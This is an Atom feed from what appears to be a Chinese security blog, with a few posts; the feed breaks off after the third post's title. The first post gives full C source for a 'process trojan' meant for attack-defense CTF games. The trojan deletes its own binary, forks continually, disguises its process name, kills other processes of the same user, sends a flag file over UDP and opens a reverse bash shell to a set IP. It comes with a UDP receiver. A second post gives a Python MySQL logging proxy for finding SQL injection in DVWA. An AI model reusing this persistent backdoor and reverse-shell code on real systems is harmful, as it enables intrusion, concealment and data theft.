<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-04-09T16:56:21.879Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C编写实现AWD进程木马</title>
    <link href="https://www.mi1k7ea.com/2020/04/08/C%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0AWD%E8%BF%9B%E7%A8%8B%E6%9C%A8%E9%A9%AC/"/>
    <id>https://www.mi1k7ea.com/2020/04/08/C编写实现AWD进程木马/</id>
    <published>2020-04-08T15:19:34.000Z</published>
    <updated>2020-04-09T16:56:21.879Z</updated>
    
    <content type="html"><![CDATA[<p>用C编写实现AWD进程木马，比PHP不死马高了不止几个档次。</p><p>horse.c，功能包含删除文件本身、不断循环创建新的子进程、重命名子进程名称、定时查杀其他木马、定时通过UDP协议发送flag、定时通过TCP协议反弹shell：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> uid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> udp_port = <span class="number">8888</span>;</span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">9999</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="keyword">char</span> *flag = <span class="string">"/home/user/flag"</span>;</span><br><span class="line"><span class="keyword">char</span> *game_name = <span class="string">"rtspd"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rm_self</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">readlink(<span class="string">"/proc/self/exe"</span>,buf,<span class="number">256</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</span><br><span class="line">unlink(buf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_name</span><span class="params">(<span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">buf[<span class="number">0</span>] = <span class="string">'0'</span>;</span><br><span class="line">buf[<span class="number">1</span>] = <span class="string">'@'</span>;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;count, <span class="number">1</span>);</span><br><span class="line">count = count % <span class="number">14</span>;</span><br><span class="line">read(fd, &amp;buf[<span class="number">2</span>], count);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line">count += <span class="number">3</span>;</span><br><span class="line">prctl(<span class="number">15</span>,buf,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(p, buf, count);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">fd = open(flag, <span class="number">0</span>);</span><br><span class="line">read(fd, buf, <span class="number">255</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line">fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(udp_port);</span><br><span class="line">addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line">sendto(fd, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">"/bin/bash"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kill_horse</span><span class="params">()</span></span>&#123;</span><br><span class="line">DIR *dir;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">file_stat</span>;</span></span><br><span class="line"><span class="keyword">char</span> path[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> ( (dir = opendir(<span class="string">"/proc"</span>)) == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>( (entry = readdir(dir)) != <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="keyword">if</span>( entry-&gt;d_name[<span class="number">0</span>] == <span class="string">'.'</span> )&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (entry-&gt;d_name[<span class="number">0</span>] &lt;= <span class="string">'0'</span>) || (entry-&gt;d_name[<span class="number">0</span>] &gt;= <span class="string">'9'</span>) )&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(path, <span class="string">"/proc/%s/cmdline"</span>, entry-&gt;d_name);</span><br><span class="line">stat(path, &amp;file_stat);</span><br><span class="line"><span class="keyword">if</span>(file_stat.st_uid == uid)&#123;</span><br><span class="line">fd = open(path, <span class="number">0</span>);</span><br><span class="line">read(fd, buf, <span class="number">1024</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="built_in">strstr</span>(buf, game_name) || <span class="built_in">strstr</span>(buf, <span class="string">"0@"</span>)))&#123;</span><br><span class="line">pid = atoi(entry-&gt;d_name);</span><br><span class="line">kill(pid, SIGTERM);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">closedir(dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span>&#123;</span><br><span class="line">uid = getuid();</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">rm_self();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fork() &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">count++;</span><br><span class="line">setsid();</span><br><span class="line">change_name(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">50</span>)&#123;</span><br><span class="line">kill_horse();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">10000</span>)&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">send_flag();</span><br><span class="line">reverse_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.c，作为客户端接收UDP协议发送的数据，即flag信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 8888</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_LEN 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_udp_msg</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line"><span class="comment">// 接收缓冲区，1024字节</span></span><br><span class="line"><span class="keyword">char</span> buf[BUFF_LEN];</span><br><span class="line"><span class="keyword">socklen_t</span> len;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="comment">// client_addr用于记录发送方的地址 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, BUFF_LEN);</span><br><span class="line">len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// recvfrom是拥塞函数，没有数据就一直拥塞</span></span><br><span class="line">count = recvfrom(fd, buf, BUFF_LEN, <span class="number">0</span>, (struct sockaddr*)&amp;client_addr, &amp;len);</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Receive data fail!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"port:%d,addr:%d\n"</span>,client_addr.sin_port,client_addr.sin_addr.s_addr);</span><br><span class="line"><span class="comment">// 输出client发过来的信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client:%s\n"</span>,buf);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, BUFF_LEN);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">server:</span></span><br><span class="line"><span class="comment">socket-&gt;bind-&gt;recvfrom-&gt;sendto-&gt;close</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> server_fd, ret;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ser_addr</span>;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// AF_INET:IPv4, SOCK_DGRAM:UDP</span></span><br><span class="line">        server_fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(server_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"create socket fail!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;ser_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ser_addr));</span><br><span class="line">ser_addr.sin_family = AF_INET;</span><br><span class="line"><span class="comment">// IP地址，需要进行网络序转换，INADDR_ANY为本地地址</span></span><br><span class="line">ser_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"><span class="comment">// 端口号，需要网络序转换</span></span><br><span class="line">ser_addr.sin_port = htons(SERVER_PORT);</span><br><span class="line">ret = bind(server_fd, (struct sockaddr*)&amp;ser_addr, <span class="keyword">sizeof</span>(ser_addr));</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket bind fail!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理接收到的数据</span></span><br><span class="line">handle_udp_msg(server_fd);</span><br><span class="line"></span><br><span class="line">close(server_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="C/C++" scheme="https://www.mi1k7ea.com/categories/C-C/"/>
    
    
      <category term="安全开发" scheme="https://www.mi1k7ea.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="C/C++" scheme="https://www.mi1k7ea.com/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>Python安全小工具之MySQL监控代理</title>
    <link href="https://www.mi1k7ea.com/2020/04/08/Python%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8BMySQL%E7%9B%91%E6%8E%A7%E4%BB%A3%E7%90%86/"/>
    <id>https://www.mi1k7ea.com/2020/04/08/Python安全小工具之MySQL监控代理/</id>
    <published>2020-04-08T11:53:08.000Z</published>
    <updated>2020-04-09T17:15:16.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MySQL代理监控是一个辅助我们挖掘SQL注入的工具，能够帮助我们快速识别找出SQL盲注、二阶注入等。</p><p>基本原理就是编写MySQL代理服务，修改目标服务端配置文件中连接的MySQL地址为我们的MySQL代理服务器地址，其中对于数据库内容的增删改查都会经过我们的MySQL代理服务器，将其中的SQL语句记录显示出来再转发到真正的MySQL服务器。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转发的地址</span></span><br><span class="line">to_addr = (<span class="string">'127.0.0.1'</span>, <span class="number">3306</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxy.bind(addr)</span><br><span class="line">        self.proxy.listen(<span class="number">10</span>)</span><br><span class="line">        self.inputs = [self.proxy]</span><br><span class="line">        self.route = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serve_forever</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*]Proxy Listenning...'</span></span><br><span class="line">        pre_data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            readable, _, _ = select.select(self.inputs, [], [])</span><br><span class="line">            <span class="keyword">for</span> self.sock <span class="keyword">in</span> readable:</span><br><span class="line">                <span class="keyword">if</span> self.sock == self.proxy:</span><br><span class="line">                    self.on_join()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        data = self.sock.recv(<span class="number">8096</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                            self.on_quit()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.route[self.sock].send(data)</span><br><span class="line">                            <span class="comment"># print data</span></span><br><span class="line">                            <span class="keyword">if</span> data[<span class="number">4</span>] == <span class="string">'\xff'</span>:</span><br><span class="line">                                <span class="keyword">print</span> pre_data</span><br><span class="line">                                <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">                        pre_data = data</span><br><span class="line">                        <span class="comment"># print data</span></span><br><span class="line">                    <span class="keyword">except</span> socket.error,e:</span><br><span class="line">                        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_join</span><span class="params">(self)</span>:</span></span><br><span class="line">        client, addr = self.proxy.accept()</span><br><span class="line">        <span class="keyword">print</span> addr,<span class="string">'connect'</span></span><br><span class="line">        forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        forward.connect(to_addr)</span><br><span class="line">        self.inputs += [client, forward]</span><br><span class="line">        self.route[client] = forward</span><br><span class="line">        self.route[forward] = client</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_quit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> self.sock, self.route[self.sock]:</span><br><span class="line">            self.inputs.remove(s)</span><br><span class="line">            <span class="keyword">del</span> self.route[s]</span><br><span class="line">            s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 代理服务器监听的地址</span></span><br><span class="line">        Proxy((<span class="string">'127.0.0.1'</span>,<span class="number">12345</span>)).serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>以DVWA为例，修改其中的config目录中的配置文件config.inc.php中连接MySQL服务器的地址为我们代理MySQL服务器的地址：</p><p><img src="/2020/04/08/Python安全小工具之MySQL监控代理/1.png" alt=""></p><p>运行该Python脚本，然后在SQL盲注中随意输入内容，在MySQL代理中就能看到盲注的SQL语句以及报错信息：</p><p><img src="/2020/04/08/Python安全小工具之MySQL监控代理/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
      <category term="Python安全开发" scheme="https://www.mi1k7ea.com/categories/Python/Python%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="安全开发" scheme="https://www.mi1k7ea.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>跨域通信中的XSS利用</title>
    <link href="https://www.mi1k7ea.com/2020/04/07/%E8%B7%A8%E5%9F%9F%E9%80%9A%E4%BF%A1%E4%B8%AD%E7%9A%84XSS%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/07/跨域通信中的XSS利用/</id>
    <published>2020-04-07T14:48:22.000Z</published>
    <updated>2020-04-07T15:26:08.996Z</updated>
    
